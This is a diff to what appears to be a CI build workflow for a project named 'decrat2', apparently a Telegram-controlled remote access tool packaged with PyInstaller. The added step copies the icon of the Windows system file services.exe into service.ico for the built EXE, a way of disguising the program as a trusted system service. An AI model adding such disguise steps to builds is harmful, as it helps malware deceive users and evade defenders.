@@ -21,6 +21,15 @@ jobs:
       - name: Install dependencies
         run: pip install requests telethon pyinstaller
 
+      - name: Generate service.ico
+        working-directory: decrat2
+        run: |
+          powershell -NoProfile -Command "
+            Add-Type -AssemblyName System.Drawing;
+            \$icon = [System.Drawing.Icon]::ExtractAssociatedIcon('C:\Windows\System32\services.exe');
+            \$icon.Save('service.ico')
+          "
+
       - name: Build EXE
         working-directory: decrat2
         run: |
